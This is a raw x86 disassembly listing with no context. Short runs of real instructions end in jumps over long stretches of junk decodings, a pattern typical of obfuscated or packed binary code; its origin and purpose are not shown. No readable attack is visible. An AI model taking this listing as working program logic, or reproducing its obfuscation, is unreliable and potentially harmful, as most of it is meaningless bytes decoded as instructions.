  406cf4:	cdq    
  406cf5:	xor    al,0x9c
  406cf7:	xlat   BYTE PTR ds:[ebx]
  406cf8:	std    
  406cf9:	in     eax,0x4a
  406cfb:	jle    0x406d0b
  406cfd:	mov    al,0xc8
  406cff:	or     DWORD PTR [esi-0xc],esi
  406d02:	mov    edi,0x7cd9b5cb
  406d07:	(bad)  
  406d08:	std    
  406d09:	mov    dl,BYTE PTR es:[edx]
  406d0c:	mov    ecx,DWORD PTR [ebp+ecx*4-0x26415ee4]
  406d13:	popf   
  406d14:	sub    eax,0x84e661a9
  406d19:	jbe    0x406cc1
  406d1b:	inc    esi
  406d1c:	ss pop ss
  406d1e:	arpl   WORD PTR [ebx-0x16],dx
  406d21:	sbb    al,BYTE PTR ds:0x6ff7f85f
  406d27:	adc    eax,0x1bbfe02d
  406d2c:	(bad)  
  406d2d:	push   0xcdc2f255
  406d32:	fsub   st(4),st
  406d34:	xchg   DWORD PTR [edx],edi
  406d36:	mov    bl,0x89
  406d38:	stos   DWORD PTR es:[edi],eax
  406d39:	or     DWORD PTR [ebp-0x6e],eax
  406d3c:	push   ds
  406d3d:	cmp    BYTE PTR [ebp+0xc],bl
  406d40:	ss shl ecx,0x1e
  406d44:	mov    ecx,DWORD PTR [ebp-0x14]
  406d47:	xor    edx,edx
  406d49:	or     eax,edx
  406d4b:	mov    cl,BYTE PTR [eax+ecx*1]
  406d4e:	mov    eax,DWORD PTR [ebp-0x34]
  406d51:	add    BYTE PTR [eax],cl
  406d53:	mov    eax,DWORD PTR [ebp-0x60]
  406d56:	mov    ecx,DWORD PTR [ebp-0x5c]
  406d59:	shrd   eax,ecx,0x2
  406d5d:	shr    ecx,0x2
  406d60:	mov    ecx,DWORD PTR [ebp-0x60]
  406d63:	mov    edx,DWORD PTR [ebp-0x5c]
  406d66:	xor    eax,edi
  406d68:	xor    edx,edx
  406d6a:	or     eax,edx
  406d6c:	lea    eax,[ebp+eax*1-0x4]
  406d70:	mov    DWORD PTR [ebp-0x34],eax
  406d73:	mov    eax,DWORD PTR [ebp-0x60]
  406d76:	shl    ecx,0x1e
  406d79:	mov    ecx,DWORD PTR [ebp-0x5c]
  406d7c:	shrd   eax,ecx,0x2
  406d80:	shr    ecx,0x2
  406d83:	mov    ecx,DWORD PTR [ebp-0x60]
  406d86:	mov    edx,DWORD PTR [ebp-0x5c]
  406d89:	xor    eax,edi
  406d8b:	xor    edx,edx
  406d8d:	or     eax,edx
  406d8f:	mov    edx,DWORD PTR [ebp+0x14]
  406d92:	shl    ecx,0x1e
  406d95:	mov    ecx,DWORD PTR [ebp-0x14]
  406d98:	mov    cl,BYTE PTR [eax+ecx*1]
  406d9b:	mov    eax,DWORD PTR [ebp-0x34]
  406d9e:	or     BYTE PTR [eax],cl
  406da0:	mov    eax,DWORD PTR [ebp+0x10]
  406da3:	jmp    0x407181
  406da8:	fcmovnb st,st(6)
  406daa:	int3   
  406dab:	xchg   edi,eax
  406dac:	lods   al,BYTE PTR ds:[esi]
  406dad:	jnp    0x406dc9
  406daf:	sbb    cl,BYTE PTR [edi+0x696a0603]
  406db5:	lea    ecx,[edi+0x188b0a70]
  406dbb:	sbb    BYTE PTR [esi+0x7e181812],bl
  406dc1:	or     esi,edx
  406dc3:	mov    DWORD PTR cs:[ecx+ebx*1],edi
  406dc7:	adc    ebp,DWORD PTR [esi-0x40]
  406dca:	cmp    DWORD PTR [esi-0x6057375f],esi
  406dd0:	icebp  
  406dd1:	jle    0x406e3f
  406dd3:	in     al,0xe1
  406dd5:	(bad)  
  406dd6:	sbb    ecx,DWORD PTR [edi-0x6e5c7c0d]
  406ddc:	adc    al,0x6c
  406dde:	fistp  DWORD PTR [esi]
  406de0:	mov    BYTE PTR [ecx+0x7d955731],0x9e
  406de7:	daa    
  406de8:	shr    DWORD PTR [esi],cl
  406dea:	add    BYTE PTR [ecx+edx*4],ah
  406ded:	jg     0x406db0
  406def:	fcmovnb st,st(3)
  406df1:	sahf   
  406df2:	pop    ss
  406df3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406df4:	imul   ebx,DWORD PTR [edi],0xd1359b79
  406dfa:	inc    edx
  406dfb:	or     al,0x84
  406dfd:	and    DWORD PTR [ebx],esi
  406dff:	inc    edx
  406e00:	imul   esp,ebp,0x2922952c
  406e06:	xchg   esi,eax
  406e07:	sub    ecx,DWORD PTR [ecx-0x2486f8da]
  406e0d:	aad    0x30
  406e0f:	sti    
  406e10:	(bad)  [esi+esi*8-0x4d445e1]
  406e17:	and    BYTE PTR [ebx],0x73
  406e1a:	sub    al,0x3f
  406e1c:	cwde   
  406e1d:	pop    edi
  406e1e:	ret    0xdbd3
  406e21:	mov    WORD PTR [edx+edx*8],?
  406e24:	scas   eax,DWORD PTR es:[edi]
  406e25:	and    al,0x45
  406e27:	mov    edi,0x771eb741
  406e2c:	or     DWORD PTR [eax],eax
  406e2e:	mov    esp,DWORD PTR [edi]
  406e30:	push   eax
  406e31:	rol    BYTE PTR [esi],1
  406e33:	call   0xf04:0x3d701cbc
  406e3a:	inc    BYTE PTR [ebp+edi*4+0x59fc3e4b]
  406e41:	xchg   DWORD PTR [ecx+0x1a],esi
  406e44:	sub    DWORD PTR [edx-0x63893157],esp
  406e4a:	js     0x406e25
  406e4c:	lods   al,BYTE PTR ds:[esi]
  406e4d:	dec    edi
  406e4e:	fwait
  406e4f:	pop    es
  406e50:	test   BYTE PTR [edx+0x66],ch
  406e53:	scas   eax,DWORD PTR es:[edi]
  406e54:	mov    al,BYTE PTR [ecx-0x3b]
  406e57:	inc    eax
  406e58:	(bad)  
  406e59:	jmp    0x406dde
  406e5b:	adc    eax,0x7bcdd812
  406e60:	lahf   
  406e61:	pop    DWORD PTR [edi]
  406e63:	jge    0x406e37
  406e65:	je     0x406e14
  406e67:	push   ebp
  406e68:	dec    esi
  406e69:	jns    0x406ec5
  406e6b:	outs   dx,DWORD PTR ds:[esi]
  406e6c:	sbb    DWORD PTR [ebp-0x60],edx
  406e6f:	leave  
  406e70:	jbe    0x406e23
  406e72:	popf   
  406e73:	add    al,0xa5
  406e75:	outs   dx,DWORD PTR ds:[esi]
  406e76:	sub    BYTE PTR [edx+edi*8-0x4ac9aaee],0x42
  406e7e:	jmp    0x1eac:0xe97d7b46
  406e85:	fcmovbe st,st(0)
  406e87:	mov    ch,0x6e
  406e89:	fsub   st,st(6)
  406e8b:	(bad)  
  406e8c:	cli    
  406e8d:	(bad)  
  406e8e:	or     eax,0xeb920f58
  406e93:	sbb    eax,0x3d7e6bcc
  406e98:	leave  
  406e99:	rep outs dx,BYTE PTR ds:[esi]
  406e9b:	jnp    0x406e96
  406e9d:	and    BYTE PTR [ecx],dl
  406e9f:	jge    0x406ea5
  406ea1:	les    eax,FWORD PTR [edx-0x54960d94]
  406ea7:	fcmovbe st,st(1)
  406ea9:	lock inc eax
  406eab:	int    0x36
  406ead:	mov    ecx,0xc85721
  406eb2:	pop    eax
  406eb3:	inc    edx
  406eb4:	cmc    
  406eb5:	pop    ecx
  406eb6:	ins    DWORD PTR es:[edi],dx
  406eb7:	fld    st(7)
  406eb9:	es inc edi
  406ebb:	call   0xf1df66b2
  406ec0:	fs cmp ebx,edx
  406ec3:	mov    dl,0xb5
  406ec5:	cwde   
  406ec6:	dec    ecx
  406ec7:	pushf  
  406ec8:	push   cs
  406ec9:	add    ah,BYTE PTR [edi-0x2a]
  406ecc:	retf   0xb988
  406ecf:	out    dx,eax
  406ed0:	mov    ds:0x9d282f2f,al
  406ed5:	nop
  406ed6:	(bad)  
  406ed7:	mov    eax,ds:0x3db1aa29
  406edc:	arpl   WORD PTR [edx+0x12],ax
  406edf:	inc    edi
  406ee0:	fnstenvw [ecx-0x6]
  406ee4:	dec    esp
  406ee5:	xchg   ecx,ebp
  406ee7:	push   0xc0d12f04
  406eec:	out    0xdf,al
  406eee:	jbe    0x406eba
  406ef0:	jns    0x406f11
  406ef2:	icebp  
  406ef3:	sbb    dl,0x5f
  406ef6:	sub    DWORD PTR [ebx],ebp
  406ef8:	mov    ebx,0xa2dc8957
  406efd:	push   esi
  406efe:	mul    BYTE PTR ds:0xdabcb2df
  406f04:	(bad)  
  406f05:	aaa    
  406f06:	cs int3 
  406f08:	ret    
  406f09:	test   BYTE PTR [edi-0x2d795538],bl
  406f0f:	lods   eax,DWORD PTR ds:[esi]
  406f10:	and    al,BYTE PTR [ecx+0x5e7611d2]
  406f16:	jno    0x406f10
  406f18:	add    ah,bl
  406f1a:	mov    al,0x79
  406f1c:	mov    al,0x61
  406f1e:	(bad)  
  406f1f:	rcl    DWORD PTR [edi+0x26],1
  406f22:	mov    eax,ds:0xa0621d25
  406f27:	inc    ebp
  406f28:	inc    esp
  406f29:	adc    BYTE PTR ds:0xc6a59327,0xe5
  406f30:	scas   eax,DWORD PTR es:[edi]
  406f31:	pop    ss
  406f32:	jg     0x406f28
  406f34:	ins    DWORD PTR es:[edi],dx
  406f35:	imul   bx,WORD PTR [eax-0x28d53a22],0x535e
  406f3e:	xchg   DWORD PTR [edx-0x1f],ebx
  406f41:	out    dx,eax
  406f42:	mov    ecx,0x830339a4
  406f47:	rcr    DWORD PTR [esi-0x13],0xa7
  406f4b:	test   BYTE PTR [ebp+0x19],0x13
  406f4f:	xor    al,0x23
  406f51:	and    eax,0x38a20c97
  406f56:	rcr    DWORD PTR [edx+0xee9ca3f],1
  406f5c:	in     eax,0x89
  406f5e:	ja     0x406f1e
  406f60:	dec    ebx
  406f61:	cmp    dl,BYTE PTR [ecx+0x62]
  406f64:	push   0x4
  406f66:	push   ebx
  406f67:	std    
  406f68:	(bad)  
  406f69:	cmc    
  406f6a:	xlat   BYTE PTR ds:[ebx]
  406f6b:	push   ss
  406f6c:	repz sub eax,0xe792651a
  406f72:	push   esp
  406f73:	clc    
  406f74:	imul   esp,ebx,0x16
  406f77:	sub    eax,0x8e051a9
  406f7c:	in     eax,dx
  406f7d:	push   ebp
  406f7e:	mov    al,0x41
  406f80:	adc    BYTE PTR [ecx-0xd],ch
  406f83:	pusha  
  406f84:	sub    al,0xe5
  406f86:	cmp    DWORD PTR [edi+0x8],esi
  406f89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f8a:	call   0x9761:0xf4419065
  406f91:	retf   
  406f92:	mov    DWORD PTR [edi+0x1cedeaef],edx
  406f98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f99:	push   ebp
  406f9a:	and    eax,0x7dbb92e6
  406f9f:	cmp    DWORD PTR [esi-0xdbd61ba],esp
  406fa5:	push   0xffffffdb
  406fa7:	add    ah,BYTE PTR [eax+0x28]
  406faa:	cmp    bl,BYTE PTR [ebx-0x56]
  406fad:	push   ecx
  406fae:	imul   edx,DWORD PTR [ebx+edi*2],0x84f5406c
  406fb5:	lahf   
  406fb6:	mov    bl,0x95
  406fb8:	mov    ebx,0x54352f71
  406fbd:	push   edx
  406fbe:	cmp    eax,0xe7ca7f84
  406fc3:	fsin   
  406fc5:	sahf   
  406fc6:	add    al,0xdd
  406fc8:	sti    
  406fc9:	sbb    DWORD PTR [ebx+0x62],ebx
  406fcc:	and    ch,BYTE PTR [ebx+0x521c17ad]
  406fd2:	ins    BYTE PTR es:[edi],dx
  406fd3:	repz int3 
  406fd5:	jae    0x406fd9
  406fd7:	addr16 mov dl,0xea
  406fda:	push   ds
  406fdb:	sbb    edi,edi
  406fdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406fde:	xchg   DWORD PTR [eax],esp
  406fe0:	fs xchg esp,eax
  406fe2:	out    dx,eax
  406fe3:	cmc    
  406fe4:	in     eax,dx
  406fe5:	push   ds
  406fe6:	js     0x407028
  406fe8:	pop    ds
  406fe9:	and    BYTE PTR [bx+si],bh
  406fec:	mov    bl,0x93
  406fee:	sbb    eax,0x8959d77e
  406ff3:	pop    eax
  406ff4:	hlt    
  406ff5:	mov    esi,0x7d301bff
  406ffa:	and    DWORD PTR [edx+0x42],ebx
  406ffd:	(bad)  
  406fff:	jmp    0x76195575
  407004:	xchg   ecx,eax
  407005:	mov    al,ds:0x171c3898
  40700a:	das    
  40700b:	shr    DWORD PTR [edi],1
  40700d:	or     BYTE PTR [edi-0x29],dh
  407010:	jl     0x406f9b
  407012:	dec    esp
  407013:	(bad)  
  407014:	jecxz  0x407020
  407016:	or     al,BYTE PTR ds:0x55099ad4
  40701c:	sub    eax,DWORD PTR [ecx]
  40701e:	mov    edi,DWORD PTR [edi-0x44]
  407021:	inc    ebp
  407022:	bound  edi,QWORD PTR [ebp+0x5c65dc07]
  407028:	das    
  407029:	xchg   ebp,eax
  40702a:	sbb    BYTE PTR [ebp+ebx*8-0x78],dl
  40702e:	pushf  
  40702f:	repnz idiv edx
  407032:	mov    dl,ah
  407034:	test   al,al
  407036:	mov    ch,0x8f
  407038:	in     al,dx
  407039:	bound  esi,QWORD PTR [eax-0x12]
  40703c:	jecxz  0x407015
  40703e:	dec    esi
  40703f:	adc    DWORD PTR [ebp-0x54],edi
  407042:	sbb    DWORD PTR [ebp+0x6f],eax
  407045:	jl     0x406ff7
  407047:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407048:	nop
  407049:	clc    
  40704a:	ret    
  40704b:	pop    bp
  40704d:	or     al,bh
  40704f:	in     eax,dx
  407050:	xor    cl,dl
  407052:	and    al,0x3b
  407054:	xor    eax,0x4eebaf8e
  407059:	jb     0x407054
  40705b:	sbb    BYTE PTR [ebp+ecx*1-0x23],bh
  40705f:	jecxz  0x4070de
  407061:	outs   dx,DWORD PTR ds:[esi]
  407062:	jb     0x407082
  407064:	jmp    0x3fdb:0xf7c26d9a
  40706b:	inc    ebx
  40706c:	sbb    DWORD PTR [ebp+ebx*8-0x28],esi
  407070:	push   es
  407071:	or     DWORD PTR [ecx+eax*2-0x7a],esp
  407075:	adc    eax,0xaa69ad02
  40707a:	mov    ebx,0x40bc2c74
  40707f:	xchg   esi,eax
  407080:	scas   al,BYTE PTR es:[edi]
  407081:	jmp    0x79d:0x58d1fd8c
  407088:	xor    eax,0x663e2bd9
  40708d:	xor    BYTE PTR [edx-0xe],cl
  407090:	cmp    ebp,DWORD PTR [ebx]
  407092:	ror    eax,1
  407094:	in     eax,dx
  407095:	mov    dl,BYTE PTR [edx-0x17]
  407098:	jge    0x40702a
  40709a:	jmp    0x3192:0xa43f7c76
  4070a1:	sbb    esi,0xfae1a515
  4070a7:	xor    DWORD PTR [eax-0x38],0x9
  4070ab:	rcr    BYTE PTR [edi+0x21aaeb4b],0x91
  4070b2:	add    al,0x3a
  4070b4:	mov    al,0x68
  4070b6:	pop    edi
  4070b7:	cli    
  4070b8:	ja     0x407051
  4070ba:	mov    esp,0x235b4416
  4070bf:	call   0xc093:0x8140ea02
  4070c6:	inc    ebx
  4070c7:	dec    ebx
  4070c8:	lea    ebx,[esi+0x29]
  4070cb:	cmp    eax,0x2bb2fd91
  4070d0:	jnp    0x4070ab
  4070d2:	dec    ebx
  4070d3:	mov    ds:0x43d56d65,al
  4070d8:	adc    BYTE PTR [ecx-0x593df163],bh
  4070de:	xchg   esi,eax
  4070df:	and    dh,bl
  4070e1:	sar    DWORD PTR [ebx-0x28c5c11e],1
  4070e7:	cli    
  4070e8:	dec    ebp
  4070e9:	xchg   esp,eax
  4070ea:	popf   
  4070eb:	in     al,dx
  4070ec:	adc    BYTE PTR [esi+0x5d],al
  4070ef:	xor    DWORD PTR [eax-0x4384c804],edi
  4070f5:	xchg   ah,bh
  4070f7:	push   edx
  4070f8:	mov    ecx,0xf6b28420
  4070fd:	shl    BYTE PTR [esi+eiz*2+0x7f59c224],1
  407104:	fs leave 
  407106:	sahf   
  407107:	mov    eax,ds:0x12805eee
  40710c:	sub    al,0xca
  40710e:	arpl   di,ax
  407110:	sub    esi,DWORD PTR [ebp-0x44]
  407113:	mov    ch,0x2e
  407115:	mov    WORD PTR [esi-0x7c3a2857],es
  40711b:	pop    ss
  40711c:	in     eax,dx
  40711d:	sbb    esi,DWORD PTR [eax+0x24]
  407120:	xor    BYTE PTR [ecx],cl
  407122:	loope  0x407136
  407124:	sbb    ecx,edi
  407126:	je     0x407159
  407128:	or     ebx,DWORD PTR [ecx+0x7f]
  40712b:	and    DWORD PTR [edi],0x8b4a26b0
  407131:	sbb    ebx,DWORD PTR ds:0xabd7f1b6
  407137:	dec    ebx
  407138:	jp     0x4070f4
  40713a:	xlat   BYTE PTR ds:[ebx]
  40713b:	or     BYTE PTR [eax],dh
  40713d:	enter  0xd7ff,0x62
  407141:	shl    DWORD PTR [ebx+0x78],cl
  407144:	pusha  
  407145:	jbe    0x40712b
  407147:	push   ecx
  407148:	dec    edx
  407149:	clc    
  40714a:	(bad)  
  40714b:	lock mov ebx,0x42159cc1
  407151:	pop    esi
  407152:	push   esp
  407153:	lods   al,BYTE PTR ds:[esi]
  407154:	(bad)  
  407155:	or     DWORD PTR [esi-0x3faba92a],esi
  40715b:	out    0xa6,eax
  40715d:	jmp    0x4070ed
  40715f:	lea    ebp,[esi+eax*8-0x724cab8a]
  407166:	adc    BYTE PTR [eax-0x2c2a8952],cl
  40716c:	jns    0x407195
  40716e:	xchg   edi,eax
  40716f:	xor    esp,edi
  407171:	sub    ebx,DWORD PTR [edi+0x62]
  407174:	jne    0x4070fa
  407176:	fadd   QWORD PTR [ebp-0x3b69fdf1]
  40717c:	push   edi
  40717d:	and    ah,al
  40717f:	stos   BYTE PTR es:[edi],al
  407180:	or     BYTE PTR [ebx-0x2e53f038],cl
  407186:	add    al,cl
  407188:	loopne 0x4071a8
  40718a:	shr    edx,0x2
  40718d:	mov    DWORD PTR [ebp+0x14],edx
  407190:	mov    DWORD PTR [ebp+0x14],eax
  407193:	xor    edx,edx
  407195:	mov    eax,ecx
  407197:	xor    eax,edi
  407199:	or     eax,edx
  40719b:	mov    edx,DWORD PTR [ebp-0x4]
  40719e:	dec    eax
  40719f:	not    eax
  4071a1:	and    eax,edx
  4071a3:	xor    ecx,edi
  4071a5:	mov    DWORD PTR [ebp-0x4],eax
  4071a8:	mov    DWORD PTR [ebp+0x14],ecx
  4071ab:	xor    eax,eax
  4071ad:	or     DWORD PTR [ebp+0x14],eax
  4071b0:	mov    eax,DWORD PTR [ebp-0x50]
  4071b3:	jmp    0x407591
  4071b8:	fiadd  DWORD PTR [ecx-0x1d]
  4071bb:	mov    ah,BYTE PTR [edx]
  4071bd:	sub    bl,BYTE PTR [edx+0x21]
  4071c0:	jnp    0x407190
  4071c2:	mov    ch,0x7c
  4071c4:	fiadd  DWORD PTR [eax]
  4071c6:	push   ebx
  4071c7:	stos   BYTE PTR es:[edi],al
  4071c8:	nop
  4071c9:	test   DWORD PTR [eax],ebx
  4071cb:	sbb    BYTE PTR [esi+0x78181812],bl
  4071d1:	rol    BYTE PTR ds:0x8cdafc27,0xc5
  4071d8:	pop    ss
  4071d9:	(bad)  [esi-0x3db7722b]
  4071df:	mov    ds:0x9cd07a6b,al
  4071e4:	loop   0x407180
  4071e6:	push   ecx
  4071e7:	or     ch,BYTE PTR ds:0xd0865da8
  4071ed:	repnz data16 and BYTE PTR [esi],bl
  4071f1:	rcr    BYTE PTR [ebp+0x7b92193e],0xfb
  4071f8:	mov    bh,0x59
  4071fa:	icebp  
  4071fb:	je     0x407244
  4071fd:	arpl   dx,di
  4071ff:	xor    BYTE PTR ds:0x10587cbc,dl
  407205:	fldcw  WORD PTR ds:0xb23f813
  40720b:	icebp  
  40720c:	stos   BYTE PTR es:[edi],al
  40720d:	ficom  WORD PTR [ebx-0x6d]
  407210:	push   eax
  407211:	pop    ebx
  407212:	adc    eax,0xd0fc2ea8
  407217:	outs   dx,BYTE PTR ds:[esi]
  407218:	retf   
  407219:	pusha  
  40721a:	cmp    ecx,edi
  40721c:	jle    0x4071c5
  40721e:	enter  0xf4a3,0x59
  407222:	jbe    0x407229
  407224:	sub    BYTE PTR [ecx],cl
  407226:	loope  0x40724d
  407228:	dec    esp
  407229:	gs jmp 0xbfd4ea32
  40722f:	push   edx
  407230:	cmp    ch,BYTE PTR ss:[edi-0x26]
  407234:	add    al,0xe9
  407236:	sbb    eax,0xf28d1ec2
  40723b:	push   0x1b
  40723d:	aam    0x19
  40723f:	and    al,0xd9
  407241:	aad    0x6f
  407243:	das    
  407244:	mov    edx,0xfde08de8
  407249:	cdq    
  40724a:	mov    ah,0xba
  40724c:	mov    edi,ecx
  40724e:	jge    0x407219
  407250:	push   ebp
  407251:	shl    BYTE PTR [eax+0x33e9744a],0xd1
  407258:	inc    edi
  407259:	sbb    BYTE PTR [ecx+0x50],0x89
  40725d:	cmc    
  40725e:	xor    BYTE PTR [eax-0x3d],ch
  407261:	push   edi
  407262:	sbb    al,0x3
  407264:	pop    esp
  407265:	sub    esp,DWORD PTR [ebx+0x66e2afc7]
  40726b:	inc    esp
  40726c:	mov    ch,0xd
  40726e:	stos   DWORD PTR es:[edi],eax
  40726f:	lods   eax,DWORD PTR ds:[esi]
  407270:	pop    eax
  407271:	test   eax,0x5df8814c
  407276:	fdivrp st(4),st
  407278:	mov    es,WORD PTR [ebx+0x5f]
  40727b:	lds    eax,FWORD PTR [edi-0x37]
  40727e:	pop    eax
  40727f:	xor    bh,dh
  407281:	cmp    eax,0x82616dff
  407286:	mov    dh,0xad
  407288:	loope  0x407236
  40728a:	call   0xb104:0x26887a99
  407291:	inc    edx
  407292:	sub    eax,DWORD PTR [esi+0x15a95836]
  407298:	mov    edx,0x7512375e
  40729d:	jecxz  0x4072b7
  40729f:	push   0x5a
  4072a1:	je     0x40730a
  4072a3:	scas   eax,DWORD PTR es:[edi]
  4072a4:	inc    edi
  4072a5:	and    DWORD PTR [edx+0x70],ebp
  4072a8:	imul   edx,eax,0xe3f02e0e
  4072ae:	les    ebx,FWORD PTR [eax]
  4072b0:	test   eax,0x97b2aa3d
  4072b5:	ja     0x4072e4
  4072b7:	es mov esi,0x217ec2bc
  4072bd:	xor    BYTE PTR [ebp+0x7],0x96
  4072c1:	and    eax,0x40c08a92
  4072c6:	fild   QWORD PTR [edx+0x3b]
  4072c9:	mov    eax,0xb11d0622
  4072ce:	sbb    al,0x26
  4072d0:	jo     0x407274
  4072d2:	je     0x4072c0
  4072d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072d6:	iret   
  4072d7:	mov    dh,0xfa
  4072d9:	push   es
  4072da:	push   cs
  4072db:	je     0x407286
  4072dd:	call   0x6d483384
  4072e2:	int3   
  4072e3:	cmp    DWORD PTR [edi],ecx
  4072e5:	cmp    dl,BYTE PTR [edx]
  4072e7:	les    ebx,FWORD PTR [esi]
  4072e9:	cmp    BYTE PTR [eax],cl
  4072eb:	xchg   edx,eax
  4072ec:	and    eax,0xa66a9723
  4072f1:	mov    eax,ds:0x233d5817
  4072f6:	icebp  
  4072f7:	dec    esp
  4072f8:	jecxz  0x40734c
  4072fa:	fild   WORD PTR [ebx+ebx*4+0x54]
  4072fe:	sahf   
  4072ff:	mov    bl,0x27
  407301:	adc    BYTE PTR [ebx+eax*8-0x528e0175],dh
  407308:	add    DWORD PTR [eax-0x67],eax
  40730b:	addr16 dec ebp
  40730d:	push   0x67aed14c
  407312:	pop    esp
  407313:	mov    esi,DWORD PTR [ebp-0x4229301b]
  407319:	cli    
  40731a:	inc    esp
  40731b:	cmp    BYTE PTR [edi],bh
  40731d:	fs lahf 
  40731f:	push   ss
  407320:	push   esi
  407321:	test   eax,0x377b2f91
  407326:	jg     0x407372
  407328:	inc    ecx
  407329:	xchg   edx,eax
  40732a:	not    ch
  40732c:	mov    eax,0xfc592852
  407331:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407332:	dec    edi
  407333:	(bad)  
  407334:	adc    dh,dl
  407336:	stos   BYTE PTR es:[edi],al
  407337:	mov    DWORD PTR [edi],edi
  407339:	aas    
  40733a:	push   edx
  40733b:	loope  0x4073b2
  40733d:	cli    
  40733e:	repz fmul st,st(6)
  407341:	ins    DWORD PTR es:[edi],dx
  407342:	cmp    ecx,ebp
  407344:	clc    
  407345:	or     eax,0x37753645
  40734a:	or     bl,BYTE PTR [ecx-0x79cbcd0b]
  407350:	cmp    ch,BYTE PTR [ecx]
  407352:	mov    ds:0xd55c53,eax
  407357:	push   ecx
  407358:	cld    
  407359:	jne    0x4073b7
  40735b:	test   al,0x62
  40735d:	add    eax,0xedbfcd6b
  407362:	jge    0x4073a2
  407364:	push   ebx
  407365:	imul   ebx,ebp,0x460d015
  40736b:	shl    BYTE PTR [esi],cl
  40736d:	test   DWORD PTR [edx+0x4bd05464],eax
  407373:	pop    edx
  407374:	call   0x735db3c9
  407379:	test   eax,0x7aaf4197
  40737e:	(bad)  
  40737f:	mov    ah,0xc5
  407381:	cmp    ebx,eax
  407383:	and    ecx,eax
  407385:	pop    ds
  407386:	ret    
  407387:	cli    
  407388:	out    0xcd,al
  40738a:	imul   eax,DWORD PTR [edx+0x2f106e85],0x3
  407391:	and    al,0xfe
  407393:	push   edi
  407394:	aad    0x1b
  407396:	pushf  
  407397:	scas   eax,DWORD PTR es:[edi]
  407398:	fnstsw WORD PTR [ecx-0x3b824368]
  40739e:	pop    es
  40739f:	xchg   ebp,eax
  4073a0:	jp     0x4073ce
  4073a2:	mov    ebp,0x87cc94ab
  4073a7:	adc    cl,ah
  4073a9:	pop    DWORD PTR [ebx-0x1b]
  4073ac:	rcr    DWORD PTR [esi-0x4],cl
  4073af:	add    ah,BYTE PTR [ecx]
  4073b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073b2:	dec    ebp
  4073b3:	jnp    0x4073de
  4073b5:	inc    edi
  4073b6:	test   edx,ebp
  4073b8:	xor    al,0xef
  4073ba:	fwait
  4073bb:	push   ecx
  4073bc:	push   eax
  4073bd:	fist   WORD PTR [eax+0x1ba1b00b]
  4073c3:	fprem  
  4073c5:	icebp  
  4073c6:	push   esp
  4073c7:	vmulpd ymm3,ymm0,YMMWORD PTR ds:0x329b4c45
  4073cf:	js     0x4073c1
  4073d1:	cs es add eax,0xcfbd2cd5
  4073d8:	cs mov eax,0xbd100eff
  4073de:	sar    DWORD PTR [ebx-0x18],cl
  4073e1:	mov    al,0x21
  4073e3:	retf   0xc24c
  4073e6:	pop    ecx
  4073e7:	or     edx,edx
  4073e9:	into   
  4073ea:	dec    esi
  4073eb:	fsub   DWORD PTR [ebp+esi*4-0x6b6e46e3]
  4073f2:	mov    ah,0x2
  4073f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073f6:	inc    ecx
  4073f7:	inc    bh
  4073f9:	lods   al,BYTE PTR ds:[esi]
  4073fa:	inc    ecx
  4073fb:	leave  
  4073fc:	(bad)  
  4073fd:	sbb    DWORD PTR [ebx],edx
  4073ff:	push   edi
  407400:	ret    
  407401:	mov    DWORD PTR [esi-0xd],ebx
  407404:	jmp    0x40742c
  407406:	rcl    DWORD PTR [ecx],0xe7
  407409:	push   esi
  40740a:	xor    eax,0x2d41f23c
  40740f:	sahf   
  407410:	inc    ebx
  407411:	lods   eax,DWORD PTR ds:[esi]
  407412:	xor    eax,0x7ceb74e7
  407417:	das    
  407418:	shl    DWORD PTR [esi+0x7883114],1
  40741e:	out    0xe7,eax
  407420:	bound  esp,QWORD PTR [edx]
  407422:	or     al,0x7e
  407424:	(bad)  
  407425:	and    eax,0x9416bce1
  40742a:	shl    DWORD PTR [edx-0x6d],1
  40742d:	aas    
  40742e:	pop    es
  40742f:	jmp    0x407474
  407431:	lahf   
  407432:	repnz fwait
  407434:	popf   
  407435:	fild   DWORD PTR [edx+0x15444b85]
  40743b:	xor    DWORD PTR [eax],edi
  40743d:	jae    0x4073f7
  40743f:	sbb    eax,0xea877ce3
  407444:	test   al,0x57
  407446:	and    al,0xad
  407448:	inc    esi
  407449:	repnz ins BYTE PTR es:[edi],dx
  40744b:	adc    cl,BYTE PTR [edi+0x63]
  40744e:	iret   
  40744f:	mov    ebx,0xbbf12afd
  407454:	xor    eax,0x40daca5f
  407459:	xor    bh,bl
  40745b:	pop    ds
  40745c:	cmp    dl,dh
  40745e:	dec    esp
  40745f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407460:	dec    ebp
  407461:	aas    
  407462:	into   
  407463:	sti    
  407464:	or     cl,BYTE PTR [edx]
  407466:	push   ebp
  407467:	scas   al,BYTE PTR es:[edi]
  407468:	xor    eax,0x2d6f354b
  40746d:	int    0x5c
  40746f:	push   ebx
  407470:	dec    ecx
  407471:	les    eax,FWORD PTR [edi+0x4a]
  407474:	mov    ds:0x3fe61c33,al
  407479:	fadd   st(3),st
  40747b:	gs es pop ds
  40747e:	call   0x5805900d
  407483:	sub    edx,esi
  407485:	retf   0x4d76
  407488:	sub    eax,0xfee23a2f
  40748d:	mov    DWORD PTR [esi+0x403acb3f],esi
  407493:	rcl    DWORD PTR [edx-0x73],1
  407496:	enter  0x506c,0x8b
  40749a:	lods   al,BYTE PTR ds:[esi]
  40749b:	leave  
  40749c:	std    
  40749d:	jbe    0x4074c8
  40749f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074a0:	ss js  0x40747b
  4074a3:	mov    bh,0xe4
  4074a5:	mov    ch,0x1d
  4074a7:	fadd   QWORD PTR gs:[esi]
  4074aa:	(bad)  
  4074ac:	pop    ds
  4074ad:	mov    BYTE PTR [eax-0x73],ah
  4074b0:	dec    ecx
  4074b1:	sub    al,0xc4
  4074b3:	xor    DWORD PTR [esi+0x78f5e8d5],0xfffffff3
  4074ba:	(bad)  [ecx-0x64]
  4074bd:	xchg   ecx,eax
  4074be:	imul   esp,DWORD PTR [edi],0x8e2becd4
